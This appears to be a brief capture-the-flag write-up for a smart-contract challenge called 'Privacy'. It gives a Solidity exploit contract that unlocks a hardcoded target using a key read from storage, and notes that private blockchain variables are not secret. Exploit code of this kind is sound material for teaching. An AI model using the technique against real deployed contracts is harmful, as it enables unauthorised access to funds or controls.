
#PRIVACY

```exploit code:
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract Exploit {
    Privacy target = Privacy(0xaDeD3F5a4bf3951994F75b2bf1F4b62C320223D6);

    function attack() public {
        bytes32 data = 0x4d0facb4f43899bc8d10e359622542f71c13229816c87dd1489cfda55163a91d;
        target.unlock(bytes16(data));
    }
}
```

##takeaways: 
nothing stored on the blockchain is private ,  not even the private variables.
